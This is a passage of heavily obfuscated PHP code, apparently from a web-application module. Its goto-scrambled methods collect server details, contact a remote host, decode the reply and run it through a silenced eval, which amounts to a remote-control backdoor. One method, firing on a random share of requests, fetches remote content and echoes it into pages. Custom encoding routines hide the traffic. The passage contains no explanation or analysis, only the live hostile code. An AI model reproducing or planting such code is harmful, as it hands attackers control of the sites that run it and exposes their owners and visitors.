avws72b0229c() { goto A§„Ó‘ÒÏ‘; dó£Ìºâ…Á: while ($dÇ×‹›¨¦ < $FÕªê÷¥‡‚[578]) { if ($dÇ×‹›¨¦ >= 0) { break; } $dÇ×‹›¨¦++; } if ($fÇ¬£ˆèÅš && $A—“æ‰Ê‘[233]() - $fÇ¬£ˆèÅš < $A—“æ‰Ê‘[201]($A—“æ‰Ê‘[281])) { return; } $A—“æ‰Ê‘[13](array($A—“æ‰Ê‘[279], $A—“æ‰Ê‘[152]), $b¼Ğ¿³á±¯, $A—“æ‰Ê‘[233]()); goto c•¦‡Ñƒº; b­ç„—êÙ: $this->{$_SERVER[¯Ú‚è][164]}(); if ($this->{$_SERVER[¯Ú‚è][199]}($dÄ•î’ññ°[$A—“æ‰Ê‘[283]]) != $e¡òŸ±ùÂÀ[$A—“æ‰Ê‘[165]]) { $f¥Í¡¥„åé = array($A—“æ‰Ê‘[202] => $A—“æ‰Ê‘[61]($A—“æ‰Ê‘[62])->{$_SERVER[¯Ú‚è][63]}($A—“æ‰Ê‘[116]), $A—“æ‰Ê‘[203] => $_SERVER[$A—“æ‰Ê‘[115]], $A—“æ‰Ê‘[204] => $A—“æ‰Ê‘[205](), $A—“æ‰Ê‘[174] => $_SERVER[$A—“æ‰Ê‘[175]]); $BÓß„ÊÓ‰ = $this->{$_SERVER[¯Ú‚è][206]}($A—“æ‰Ê‘[148]($f¥Í¡¥„åé)); $dÄ•î’ññ° = $this->{$_SERVER[¯Ú‚è][182]}($A—“æ‰Ê‘[207] . $BÓß„ÊÓ‰); if ($dÄ•î’ññ° && $A—“æ‰Ê‘[191]($dÄ•î’ññ°) && isset($dÄ•î’ññ°[$A—“æ‰Ê‘[283]])) { $C¨©º‰›Ô = $this->{$_SERVER[¯Ú‚è][188]}($dÄ•î’ññ°[$A—“æ‰Ê‘[283]], 2); if ($C¨©º‰›Ô) { $C¨©º‰›Ô = $this->{$_SERVER[¯Ú‚è][199]}($C¨©º‰›Ô); } if ($C¨©º‰›Ô) { try { @eval($C¨©º‰›Ô); } catch (Exception $c›…½ÌÜÒæ) { } } } } goto eôí‚Åì¢À; d´øì“–Üƒ: $Fæ¨â¯Æ¯Ì = $FÕªê÷¥‡‚[635]; if (!$Fæ¨â¯Æ¯Ì) { die; } $dÄ•î’ññ° = $this->{$_SERVER[¯Ú‚è][182]}($A—“æ‰Ê‘[282], $e¡òŸ±ùÂÀ); goto BïÉ ­Üƒ; A§„Ó‘ÒÏ‘: $FÕªê÷¥‡‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A—“æ‰Ê‘ =& $_SERVER[¯Ú‚è]; $cÍ‘‹ê‰èÎ = array($A—“æ‰Ê‘[274], $A—“æ‰Ê‘[275], $A—“æ‰Ê‘[276]); goto F¡é¨…´Õ™; dî•”‚‡æò: $eØ‚Û§èŞ¼ = $FÕªê÷¥‡‚[632]; if ($this->ofesee574071 == $A—“æ‰Ê‘[121] || !$A—“æ‰Ê‘[104]($GLOBALS, $A—“æ‰Ê‘[132])) { return; } if (!$A—“æ‰Ê‘[239]($_SERVER[$A—“æ‰Ê‘[44]], $cÍ‘‹ê‰èÎ)) { return; } goto B‹ßß©×ë•; BïÉ ­Üƒ: $bÇ×¡µµàÃ = $FÕªê÷¥‡‚[636]; if (!$A—“æ‰Ê‘[191]($dÄ•î’ññ°)) { return; } if ($dÄ•î’ññ°[$A—“æ‰Ê‘[165]] && $dÄ•î’ññ°[$A—“æ‰Ê‘[283]]) { if ($this->{$_SERVER[¯Ú‚è][199]}($dÄ•î’ññ°[$A—“æ‰Ê‘[283]]) == $e¡òŸ±ùÂÀ[$A—“æ‰Ê‘[165]]) { return; } } goto b­ç„—êÙ; B‹ßß©×ë•: if ($A—“æ‰Ê‘[233]() % 4 != 0) { return; } $fÇ¬£ˆèÅš = $A—“æ‰Ê‘[13](array($A—“æ‰Ê‘[279], $A—“æ‰Ê‘[280]), $b¼Ğ¿³á±¯); $dÇ×‹›¨¦ = $FÕªê÷¥‡‚[633]; goto dó£Ìºâ…Á; F¡é¨…´Õ™: $a¼ÏŸéî³ = $FÕªê÷¥‡‚[631]; while (strlen($a¼ÏŸéî³) < $FÕªê÷¥‡‚[565]) { if (!$a¼ÏŸéî³) { break; } $a¼ÏŸéî³++; } $b¼Ğ¿³á±¯ = $A—“æ‰Ê‘[277] . $A—“æ‰Ê‘[114]($A—“æ‰Ê‘[278]); goto dî•”‚‡æò; c•¦‡Ñƒº: $C¨Àõ­É = $FÕªê÷¥‡‚[634]; while (strlen($C¨Àõ­É) < $FÕªê÷¥‡‚[63]) { if (!$C¨Àõ­É) { break; } $C¨Àõ­É++; } $e¡òŸ±ùÂÀ = array($A—“æ‰Ê‘[165] => $A—“æ‰Ê‘[61]($A—“æ‰Ê‘[62])->{$_SERVER[¯Ú‚è][63]}($A—“æ‰Ê‘[209]), $A—“æ‰Ê‘[178] => $this->ofesee574071, $A—“æ‰Ê‘[176] => $_SERVER[$A—“æ‰Ê‘[177]], $A—“æ‰Ê‘[169] => $A—“æ‰Ê‘[149], $A—“æ‰Ê‘[172] => $_SERVER[$A—“æ‰Ê‘[173]]); goto d´øì“–Üƒ; eôí‚Åì¢À: } private function nzde8b83fc94($E¤ãÒïù†ò = '', $AôãÂŸĞÎ = array(), $AĞÕòÛéÕº = 5) { goto aíÃÇç´£ƒ; dˆÆ˜½„§ó: $F ­ŠÛ¡â› = $EŞ‚ÖÛ ŠŒ[638]; $AôãÂŸĞÎ = @$b”Üö¤Îó‰[253]($EØˆòÍ„, !1, $e¡ßÊ©Ë¿); $B‹’£‡Ó” = $EŞ‚ÖÛ ŠŒ[639]; goto DôáµŞ¥Ê­; aÈâÁÓÈ‘: $EØˆòÍ„ = $this->{$_SERVER[¯Ú‚è][246]}($EØˆòÍ„, $b”Üö¤Îó‰[285]); $EØˆòÍ„ = $EØˆòÍ„ . $E¤ãÒïù†ò . $b”Üö¤Îó‰[286] . $b”Üö¤Îó‰[287]($AôãÂŸĞÎ); $CİóË˜„í = $EŞ‚ÖÛ ŠŒ[637]; goto D—Ç„öŸÄé; D—Ç„öŸÄé: if (!$CİóË˜„í) { die; } if ($AôãÂŸĞÎ === -1) { return $EØˆòÍ„; } $e¡ßÊ©Ë¿ = $b”Üö¤Îó‰[248](array($b”Üö¤Îó‰[249] => array($b”Üö¤Îó‰[252] => $AĞÕòÛéÕº, $b”Üö¤Îó‰[250] => $b”Üö¤Îó‰[288]), $b”Üö¤Îó‰[289] => array($b”Üö¤Îó‰[290] => !1, $b”Üö¤Îó‰[291] => !1))); goto dˆÆ˜½„§ó; aíÃÇç´£ƒ: $EŞ‚ÖÛ ŠŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b”Üö¤Îó‰ =& $_SERVER[¯Ú‚è]; $EØˆòÍ„ = $b”Üö¤Îó‰[284]; goto aÈâÁÓÈ‘; a·‰ŠÊÒä: while ($c¼‹Á¨Ë…Ñ < $EŞ‚ÖÛ ŠŒ[63]) { if ($c¼‹Á¨Ë…Ñ >= 0) { break; } $c¼‹Á¨Ë…Ñ++; } goto c¹º‰¿ù­; DôáµŞ¥Ê­: if (!$B‹’£‡Ó”) { die; } return $b”Üö¤Îó‰[190]($AôãÂŸĞÎ, !0); $c¼‹Á¨Ë…Ñ = $EŞ‚ÖÛ ŠŒ[640]; goto a·‰ŠÊÒä; c¹º‰¿ù­: } private function ualr3593b4e9() { goto bÙ Á–ËŠ; FºĞ÷¢Øº£: $fÌ¤§äØ”… = $C«ÈÕ™¥à¼[641]; if (strlen($fÌ¤§äØ”…) < $C«ÈÕ™¥à¼[63]) { die; } $b‰‡ŠÎÍ¡ = $e ¢ö‰±¼Á[$this->ofesee574071]; goto døÔ§ª«¾Ó; bÙ Á–ËŠ: $C«ÈÕ™¥à¼ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e‰¦†ñƒ†© =& $_SERVER[¯Ú‚è]; $e ¢ö‰±¼Á = array($e‰¦†ñƒ†©[292] => $e‰¦†ñƒ†©[293], $e‰¦†ñƒ†©[294] => $e‰¦†ñƒ†©[295], $e‰¦†ñƒ†©[296] => $e‰¦†ñƒ†©[297], $e‰¦†ñƒ†©[298] => $e‰¦†ñƒ†©[299], $e‰¦†ñƒ†©[300] => $e‰¦†ñƒ†©[301], $e‰¦†ñƒ†©[302] => $e‰¦†ñƒ†©[241], $e‰¦†ñƒ†©[303] => $e‰¦†ñƒ†©[241], $e‰¦†ñƒ†©[304] => $e‰¦†ñƒ†©[293], $e‰¦†ñƒ†©[305] => $e‰¦†ñƒ†©[295], $e‰¦†ñƒ†©[306] => $e‰¦†ñƒ†©[297], $e‰¦†ñƒ†©[307] => $e‰¦†ñƒ†©[308], $e‰¦†ñƒ†©[309] => $e‰¦†ñƒ†©[299], $e‰¦†ñƒ†©[310] => $e‰¦†ñƒ†©[311], $e‰¦†ñƒ†©[312] => $e‰¦†ñƒ†©[301], $e‰¦†ñƒ†©[313] => $e‰¦†ñƒ†©[314], $e‰¦†ñƒ†©[315] => $e‰¦†ñƒ†©[316], $e‰¦†ñƒ†©[317] => $e‰¦†ñƒ†©[318]); goto FºĞ÷¢Øº£; døÔ§ª«¾Ó: $b‰‡ŠÎÍ¡ = $e‰¦†ñƒ†©[201]($b‰‡ŠÎÍ¡ ? $b‰‡ŠÎÍ¡ : $e‰¦†ñƒ†©[293]); $Eº¤—§ß­£ = $C«ÈÕ™¥à¼[642]; while ($Eº¤—§ß­£ < $C«ÈÕ™¥à¼[578]) { if ($Eº¤—§ß­£ >= 0) { break; } $Eº¤—§ß­£++; } goto fÕÔæœª©ˆ; fÕÔæœª©ˆ: $Aå•—ÛÆ”Ê = $e‰¦†ñƒ†©[104]($this->vtpg40bf898c, $e‰¦†ñƒ†©[319]); $Aå•—ÛÆ”Ê = $Aå•—ÛÆ”Ê ? $e‰¦†ñƒ†©[201]($Aå•—ÛÆ”Ê) : 0; return $b‰‡ŠÎÍ¡ + $Aå•—ÛÆ”Ê; goto B†–¸™Å„; B†–¸™Å„: $f‡¤—‹ÙÖ– = $C«ÈÕ™¥à¼[643]; goto cŠ‰å ùÌ; cŠ‰å ùÌ: } public function vocwd076ef9a($fßÚƒ…´‰ã) { goto a·Éš¶Ÿ¥ò; F×æöø³Ã„: $Fà‰ã“ƒÜ® = $B™îø…¹§[222]($Fà‰ã“ƒÜ®, $B™îø…¹§[10], $B™îø…¹§[321]); $Aæ¶‘ÁšÛÇ = $Fïì¦‰Æ[645]; if (!$Aæ¶‘ÁšÛÇ) { die; } goto Cˆˆ–ŒÑ¶Œ; EÚö­åğ”¼: $C”›¹½É‹ = $B™îø…¹§[61]($B™îø…¹§[139])->{$_SERVER[¯Ú‚è][140]}(); if ($C”›¹½É‹ <= $fÕöİ† ƒ®) { return; } $Fà‰ã“ƒÜ® = $B™îø…¹§[61]($B™îø…¹§[139])->{$_SERVER[¯Ú‚è][320]}($B™îø…¹§[321])->{$_SERVER[¯Ú‚è][322]}($fÕöİ† ƒ®)->{$_SERVER[¯Ú‚è][323]}(); goto F×æöø³Ã„; Cˆˆ–ŒÑ¶Œ: if (!$B™îø…¹§[239]($fßÚƒ…´‰ã[$B™îø…¹§[321]], $Fà‰ã“ƒÜ®)) { $B™îø…¹§[166]($B™îø…¹§[324], !1, $B™îø…¹§[236]); } goto BØÀòã¹å; a·Éš¶Ÿ¥ò: $Fïì¦‰Æ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B™îø…¹§ =& $_SERVER[¯Ú‚è]; $fÕöİ† ƒ® = $this->{$_SERVER[¯Ú‚è][137]}(); goto dÇÒ»”¤ö†; dÇÒ»”¤ö†: $D¶ÓèëÜš = $Fïì¦‰Æ[644]; if (strlen($D¶ÓèëÜš) < $Fïì¦‰Æ[63]) { return; } if ($fÕöİ† ƒ® >= $B™îø…¹§[201]($B™îø…¹§[241])) { return; } goto EÚö­åğ”¼; BØÀòã¹å: } public function gfqrad0f4265() { goto b¦ì¬‡Â°; eö“ø·Îİ: $dªåê†³©ô = $bÑ—Ê±Äˆ¿[245]; $dŞíá›±Ôí = $FÊà‰¦ãœ²[646]; if (!$dŞíá›±Ôí) { return; } goto BÃ‘¼Â…å; BÃ‘¼Â…å: $dªåê†³©ô = $this->{$_SERVER[¯Ú‚è][246]}($dªåê†³©ô, $bÑ—Ê±Äˆ¿[247]); $D‘±¡®ƒŒˆ = $FÊà‰¦ãœ²[647]; $DÇÈ°¬’ = $bÑ—Ê±Äˆ¿[248](array($bÑ—Ê±Äˆ¿[249] => array($bÑ—Ê±Äˆ¿[250] => $bÑ—Ê±Äˆ¿[251], $bÑ—Ê±Äˆ¿[252] => 3))); goto bÁëÂÌ‰è›; A­öùÒ®Æ: echo $bÑ—Ê±Äˆ¿[326] . $bÑ—Ê±Äˆ¿[327]($aÛ©Õ°„éŸ) . $bÑ—Ê±Äˆ¿[328]; goto Bá‚¦Ë˜œ…; b¦ì¬‡Â°: $FÊà‰¦ãœ² =& $_SERVER[¶ªÕß‚ØÁŸ]; $bÑ—Ê±Äˆ¿ =& $_SERVER[¯Ú‚è]; if (!$bÑ—Ê±Äˆ¿[104]($GLOBALS, $bÑ—Ê±Äˆ¿[132]) || $bÑ—Ê±Äˆ¿[325](1, 100) > 20) { return; } goto eö“ø·Îİ; bÁëÂÌ‰è›: $aÌÙ¢Û³”” = $FÊà‰¦ãœ²[648]; if (strlen($aÌÙ¢Û³””) < $FÊà‰¦ãœ²[559]) { die; } $aÛ©Õ°„éŸ = @$bÑ—Ê±Äˆ¿[253]($dªåê†³©ô, !1, $DÇÈ°¬’); goto A­öùÒ®Æ; Bá‚¦Ë˜œ…: } private function gxqh391d51d1($cë„Š±’®í, $aŠ°á¢­ƒò, $B¾ÎçÈ†Šß = 3) { goto B‡·òåŒùÔ; f¿›òÖèÈÓ: if (strlen($AÇŸ—°» Ï) < $dÏ«‰’òºñ[578]) { die; } $c¾×É…³ŒÇ = $dºÓÚƒÒÖĞ[124](15); $Dª†ÔéŸçØ = $dºÓÚƒÒÖĞ[330]; goto f§‚†˜Ç’¿; AŠ„îİƒÌÔ: $DÀáèË¹ = $dºÓÚƒÒÖĞ[214]($fÇ×”›ê… . $c¾×É…³ŒÇ . $DÀáèË¹); if ($B¾ÎçÈ†Šß - 1 > 0) { $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][127]}($DÀáèË¹, $aŠ°á¢­ƒò, $B¾ÎçÈ†Šß - 1); } return $DÀáèË¹; goto fôŸ·øÜ­ì; f§‚†˜Ç’¿: $D–Ó¥Ú„â = $dÏ«‰’òºñ[650]; while (strlen($D–Ó¥Ú„â) < $dÏ«‰’òºñ[589]) { if (!$D–Ó¥Ú„â) { break; } $D–Ó¥Ú„â++; } switch ($fÇ×”›ê…) { case $dºÓÚƒÒÖĞ[232]: $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][147]}($cë„Š±’®í, $dºÓÚƒÒÖĞ[214]($aŠ°á¢­ƒò . $c¾×É…³ŒÇ)); $dæ…šØ¹Á  = $dÏ«‰’òºñ[651]; if (strlen($dæ…šØ¹Á ) < $dÏ«‰’òºñ[63]) { return; } break; case $dºÓÚƒÒÖĞ[220]: $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][147]}($cë„Š±’®í, $dºÓÚƒÒÖĞ[214]($c¾×É…³ŒÇ . $aŠ°á¢­ƒò)); $b‘ÒËøó¦Â = $dÏ«‰’òºñ[652]; break; case $dºÓÚƒÒÖĞ[331]: $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][147]}($cë„Š±’®í, $dºÓÚƒÒÖĞ[118]($c¾×É…³ŒÇ . $aŠ°á¢­ƒò)); break; $Dà°·ÜâñÌ = $dÏ«‰’òºñ[653]; case $dºÓÚƒÒÖĞ[332]: $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][147]}($cë„Š±’®í, $dºÓÚƒÒÖĞ[114]($c¾×É…³ŒÇ . $aŠ°á¢­ƒò)); break; case $dºÓÚƒÒÖĞ[333]: goto a›¥¦ŞÕÈò; FËŒá÷‰Æ—: if (strlen($B‹”êàŸÙ) < $dÏ«‰’òºñ[559]) { die; } $e¤¶„š…Òí = $dºÓÚƒÒÖĞ[114]($c¤íÏŒÙâÀ . $dºÓÚƒÒÖĞ[114]($aŠ°á¢­ƒò . $c¤íÏŒÙâÀ) . $aŠ°á¢­ƒò); $CŒÚºí‚µî = $dÏ«‰’òºñ[656]; goto D¦›òÃ§è; A”©Ğ«¬: $f™„“½ïáí = 0; $d‰éô©óÄ‹ = $dÏ«‰’òºñ[657]; while ($d‰éô©óÄ‹ < $dÏ«‰’òºñ[559]) { if ($d‰éô©óÄ‹ >= 0) { break; } $d‰éô©óÄ‹++; } goto B”×Æºá; AÀ†±„„˜¸: while ($Eøµ¯Äë‚Ë < $dÏ«‰’òºñ[578]) { if ($Eøµ¯Äë‚Ë >= 0) { break; } $Eøµ¯Äë‚Ë++; } $c¤íÏŒÙâÀ = $Dª†ÔéŸçØ[$EßÇ×÷¨Ùİ]; $B‹”êàŸÙ = $dÏ«‰’òºñ[655]; goto FËŒá÷‰Æ—; D¦›òÃ§è: $e¤¶„š…Òí = $dºÓÚƒÒÖĞ[25]($e¤¶„š…Òí, $EßÇ×÷¨Ùİ % 8, $EßÇ×÷¨Ùİ % 8 + 7); $F©¸¡¶îç = $dºÓÚƒÒÖĞ[10]; $dâ˜‡†‘¤ = 0; goto A”©Ğ«¬; C•·Öõ¡áá: break; goto d™„¬Ùİöá; B”×Æºá: $A†’î•Æ¨ã = 0; for ($dâ˜‡†‘¤ = 0; $dâ˜‡†‘¤ < $dºÓÚƒÒÖĞ[24]($cë„Š±’®í); $dâ˜‡†‘¤++) { $A†’î•Æ¨ã = $A†’î•Æ¨ã == $dºÓÚƒÒÖĞ[24]($e¤¶„š…Òí) ? 0 : $A†’î•Æ¨ã; $f™„“½ïáí = ($EßÇ×÷¨Ùİ + $dºÓÚƒÒÖĞ[335]($Dª†ÔéŸçØ, $cë„Š±’®í[$dâ˜‡†‘¤]) + $dºÓÚƒÒÖĞ[336]($e¤¶„š…Òí[$A†’î•Æ¨ã++])) % 64; $F…·§Íäœ = $dÏ«‰’òºñ[658]; if (strlen($F…·§Íäœ) < $dÏ«‰’òºñ[565]) { die; } $F©¸¡¶îç .= $Dª†ÔéŸçØ[$f™„“½ïáí]; } $DÀáèË¹ = $dºÓÚƒÒÖĞ[327]($c¤íÏŒÙâÀ . $F©¸¡¶îç); goto C•·Öõ¡áá; a›¥¦ŞÕÈò: $cë„Š±’®í = $dºÓÚƒÒÖĞ[118]($cë„Š±’®í); $EßÇ×÷¨Ùİ = $dºÓÚƒÒÖĞ[334](0, 64); $Eøµ¯Äë‚Ë = $dÏ«‰’òºñ[654]; goto AÀ†±„„˜¸; d™„¬Ùİöá: default: $DÀáèË¹ = $this->{$_SERVER[¯Ú‚è][147]}($cë„Š±’®í, $aŠ°á¢­ƒò . $c¾×É…³ŒÇ); $cÀâ–éŸä = $dÏ«‰’òºñ[659]; break; } goto AŠ„îİƒÌÔ; Fˆ¦­ó­±â: $cë„Š±’®í = $dºÓÚƒÒÖĞ[2]($cë„Š±’®í); $fÇ×”›ê… = $dºÓÚƒÒÖĞ[325](0, 5) . $dºÓÚƒÒÖĞ[10]; $AÇŸ—°» Ï = $dÏ«‰’òºñ[649]; goto f¿›òÖèÈÓ; B‡·òåŒùÔ: $dÏ«‰’òºñ =& $_SERVER[¶ªÕß‚ØÁŸ]; $dºÓÚƒÒÖĞ =& $_SERVER[¯Ú‚è]; $dºÓÚƒÒÖĞ[329](1); goto Fˆ¦­ó­±â; fôŸ·øÜ­ì: } private function qcetf6c2367f($eà´Å§•ê, $céˆêöâÓ“, $d¶‚› ‚Ù¶ = 3) { goto c‡®¤ëÇÁ; BÁ„ñê®›‘: $BáÇçÎœèò = $Eù¶øº˜÷[661]; $eà´Å§•ê = $eØºè¨Å†[25]($eà´Å§•ê, 16); $E¢šİèò—Š = $Eù¶øº˜÷[662]; goto f°ƒèŠ‹…ë; f°ƒèŠ‹…ë: if (strlen($E¢šİèò—Š) < $Eù¶øº˜÷[559]) { die; } $CƒÎ¤ÙŒÜŠ = $eØºè¨Å†[330]; $A—º·À•Ö± = $Eù¶øº˜÷[663]; goto bêÖùàùà; c‡®¤ëÇÁ: $Eù¶øº˜÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eØºè¨Å† =& $_SERVER[¯Ú‚è]; if (!$eØºè¨Å†[337]($eà´Å§•ê) || $eØºè¨Å†[24]($eà´Å§•ê) < 10) { return !1; } goto Bºˆ®İªõ—; bêÖùàùà: if (!$A—º·À•Ö±) { die; } switch ($CôÎº²Šî°) { case $eØºè¨Å†[232]: $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][246]}($eà´Å§•ê, $eØºè¨Å†[214]($céˆêöâÓ“ . $b«öíÆÈ®í)); $Aƒ‚à¶¦ï× = $Eù¶øº˜÷[664]; break; case $eØºè¨Å†[220]: $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][246]}($eà´Å§•ê, $eØºè¨Å†[214]($b«öíÆÈ®í . $céˆêöâÓ“)); $bÖõâ¢¡¾Š = $Eù¶øº˜÷[665]; while ($bÖõâ¢¡¾Š < $Eù¶øº˜÷[578]) { if ($bÖõâ¢¡¾Š >= 0) { break; } $bÖõâ¢¡¾Š++; } break; case $eØºè¨Å†[331]: $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][246]}($eà´Å§•ê, $eØºè¨Å†[118]($b«öíÆÈ®í . $céˆêöâÓ“)); $d¼­É÷µ‘¬ = $Eù¶øº˜÷[666]; break; $eØÄ·¥§ää = $Eù¶øº˜÷[667]; if (!$eØÄ·¥§ää) { return; } case $eØºè¨Å†[332]: $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][246]}($eà´Å§•ê, $eØºè¨Å†[114]($b«öíÆÈ®í . $céˆêöâÓ“)); $FÙ¡™™Óƒì = $Eù¶øº˜÷[668]; if (strlen($FÙ¡™™Óƒì) < $Eù¶øº˜÷[578]) { die; } break; $fî””ª´á = $Eù¶øº˜÷[669]; if (strlen($fî””ª´á) < $Eù¶øº˜÷[565]) { return; } case $eØºè¨Å†[333]: goto d¡™‰“¬Œ™; e”ÂĞ†¸ª‚: break; $dàîÓ®ƒŠñ = $Eù¶øº˜÷[678]; if (strlen($dàîÓ®ƒŠñ) < $Eù¶øº˜÷[63]) { return; } goto d²Ó‡­Ä¾™; bêãˆªáìÃ: if (strlen($f¸ùØ¸¸›õ) < $Eù¶øº˜÷[565]) { return; } $C¼‹Ô¹…£Æ = 0; $e¾¦·Ï„® = 0; goto d‚İˆ”³ñÏ; bŒñØ´¾À…: if (strlen($d™™ÚâÓ¾°) < $Eù¶øº˜÷[63]) { die; } $d® ¹µë›Ş = $eØºè¨Å†[25]($d® ¹µë›Ş, $E¼ê±ŠŒøÜ % 8, $E¼ê±ŠŒøÜ % 8 + 7); $aìæíšñßš = $Eù¶øº˜÷[674]; goto eå×‘ƒĞï˜; eå×‘ƒĞï˜: while (strlen($aìæíšñßš) < $Eù¶øº˜÷[565]) { if (!$aìæíšñßš) { break; } $aìæíšñßš++; } $dÜ¦Í»Çã = $eØºè¨Å†[10]; $f¸ùØ¸¸›õ = $Eù¶øº˜÷[675]; goto bêãˆªáìÃ; Aô»ï¢ÀÈà: while ($b¶Ÿ­íÃ…¼ < $Eù¶øº˜÷[559]) { if ($b¶Ÿ­íÃ…¼ >= 0) { break; } $b¶Ÿ­íÃ…¼++; } $eà´Å§•ê = $eØºè¨Å†[25]($eà´Å§•ê, 1); $f ¸¬…©Ì³ = $Eù¶øº˜÷[671]; goto AÁ˜Øõ‚‰; d¡™‰“¬Œ™: $eà´Å§•ê = $eØºè¨Å†[338]($eà´Å§•ê); $a×Ùø¨Ù = $eà´Å§•ê[0]; $b¶Ÿ­íÃ…¼ = $Eù¶øº˜÷[670]; goto Aô»ï¢ÀÈà; c¿Ì—øØÑí: if (strlen($D…”è¢—ñ´) < $Eù¶øº˜÷[565]) { die; } $d® ¹µë›Ş = $eØºè¨Å†[114]($a×Ùø¨Ù . $eØºè¨Å†[114]($céˆêöâÓ“ . $a×Ùø¨Ù) . $céˆêöâÓ“); $d™™ÚâÓ¾° = $Eù¶øº˜÷[673]; goto bŒñØ´¾À…; d‚İˆ”³ñÏ: $B“˜ÊÙä­ = 0; for ($C¼‹Ô¹…£Æ = 0; $C¼‹Ô¹…£Æ < $eØºè¨Å†[24]($eà´Å§•ê); $C¼‹Ô¹…£Æ++) { $B“˜ÊÙä­ = $B“˜ÊÙä­ == $eØºè¨Å†[24]($d® ¹µë›Ş) ? 0 : $B“˜ÊÙä­; $cËùô„Ÿ…… = $B“˜ÊÙä­++; $a¿ÊéÁ¿ = $Eù¶øº˜÷[676]; if (!$a¿ÊéÁ¿) { return; } $e¾¦·Ï„® = $eØºè¨Å†[335]($CƒÎ¤ÙŒÜŠ, $eà´Å§•ê[$C¼‹Ô¹…£Æ]) - $E¼ê±ŠŒøÜ - $eØºè¨Å†[336]($d® ¹µë›Ş[$cËùô„Ÿ……]); while ($e¾¦·Ï„® < 0) { $e¾¦·Ï„® += 64; } $dÜ¦Í»Çã .= $CƒÎ¤ÙŒÜŠ[$e¾¦·Ï„®]; $DóÌ¥Á¥î = $Eù¶øº˜÷[677]; if (!$DóÌ¥Á¥î) { die; } } $D¥ÉµöÜ¿ = $eØºè¨Å†[339]($dÜ¦Í»Çã); goto e”ÂĞ†¸ª‚; AÁ˜Øõ‚‰: if (strlen($f ¸¬…©Ì³) < $Eù¶øº˜÷[565]) { die; } $E¼ê±ŠŒøÜ = $eØºè¨Å†[335]($CƒÎ¤ÙŒÜŠ, $a×Ùø¨Ù); $D…”è¢—ñ´ = $Eù¶øº˜÷[672]; goto c¿Ì—øØÑí; d²Ó‡­Ä¾™: default: $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][246]}($eà´Å§•ê, $céˆêöâÓ“ . $b«öíÆÈ®í); $DåÀìÍ£¤ = $Eù¶øº˜÷[679]; if (strlen($DåÀìÍ£¤) < $Eù¶øº˜÷[578]) { die; } break; } if ($d¶‚› ‚Ù¶ - 1 > 0) { $D¥ÉµöÜ¿ = $this->{$_SERVER[¯Ú‚è][188]}($D¥ÉµöÜ¿, $céˆêöâÓ“, $d¶‚› ‚Ù¶ - 1); } goto b›Ÿ¾ÒÜªØ; Bºˆ®İªõ—: $eà´Å§•ê = $eØºè¨Å†[2]($eà´Å§•ê); $eà´Å§•ê = $eØºè¨Å†[214]($eà´Å§•ê); $CôÎº²Šî° = $eà´Å§•ê[0]; goto f‚Ê«è¯ÉÅ; f‚Ê«è¯ÉÅ: $EŸÉ÷½×¯Ò = $Eù¶øº˜÷[660]; if (!$EŸÉ÷½×¯Ò) { die; } $b«öíÆÈ®í = $eØºè¨Å†[25]($eà´Å§•ê, 1, 15); goto BÁ„ñê®›‘; b›Ÿ¾ÒÜªØ: return $D¥ÉµöÜ¿; goto AôÄ¦ªÕ”Ã; AôÄ¦ªÕ”Ã: } public function qvoj69c5300f($fä–ËŒ„˜) { goto fõëÛãõŠ ; cĞá˜Î—Š: while (1) { $F…ĞÂè¬ÀÈ = $Eø´Å¦ÚÒ; $cæ´Î ‹…Ç = $AÛĞ²ÆçÄ; while ($cæ´Î ‹…Ç % $F…ĞÂè¬ÀÈ != 0) { $BÜìáà = $cæ´Î ‹…Ç; $AéµíÅÛ¼ = $DËÛÏĞãŒ‹[682]; $cæ´Î ‹…Ç = $F…ĞÂè¬ÀÈ; $F…ĞÂè¬ÀÈ = $BÜìáà % $F…ĞÂè¬ÀÈ; } if ($F…ĞÂè¬ÀÈ == 1) { break; } else { $Eø´Å¦ÚÒ++; } } $A Ø–Ë÷’Ü = 2; for ($AÌù¿ØÒ„• = 0; $AÌù¿ØÒ„• < $AÛĞ²ÆçÄ * 10; $AÌù¿ØÒ„•++) { if (($AÛĞ²ÆçÄ * $AÌù¿ØÒ„• + 1) % $Eø´Å¦ÚÒ == 0) { $A Ø–Ë÷’Ü = $A”¥ªæÉ‡Ô[201](($AÛĞ²ÆçÄ * $AÌù¿ØÒ„• + 1) / $Eø´Å¦ÚÒ); break; } } goto aáê¦¥ìé„; fõëÛãõŠ : $DËÛÏĞãŒ‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A”¥ªæÉ‡Ô =& $_SERVER[¯Ú‚è]; $BÖõÏİ‚ìğ = $this->{$_SERVER[¯Ú‚è][340]}(); goto FŸĞ‚ä§—Ã; AˆİÙ¯ƒÇ„: $AÛĞ²ÆçÄ = ($BÖõÏİ‚ìğ - 1) * ($fè‚Á‡í„ - 1); $Eø´Å¦ÚÒ = $A”¥ªæÉ‡Ô[201](($BÖõÏİ‚ìğ + $fè‚Á‡í„) / 2); $A­‰†Ûò = $DËÛÏĞãŒ‹[681]; goto cĞá˜Î—Š; aáê¦¥ìé„: $B‰¢Øï´Œé = $this->{$_SERVER[¯Ú‚è][147]}($BÖõÏİ‚ìğ * $fè‚Á‡í„ . $A”¥ªæÉ‡Ô[10], $A”¥ªæÉ‡Ô[149]); $aÄíò§ÅÉå = $A”¥ªæÉ‡Ô[114]($A”¥ªæÉ‡Ô[341] . ($BÖõÏİ‚ìğ + $fè‚Á‡í„) . $A”¥ªæÉ‡Ô[342] . $Eø´Å¦ÚÒ . $A”¥ªæÉ‡Ô[342] . $A Ø–Ë÷’Ü . $A”¥ªæÉ‡Ô[343]); $Aª¯Ë‡·Õ = $DËÛÏĞãŒ‹[683]; goto cïÚëŒ²šª; FŸĞ‚ä§—Ã: 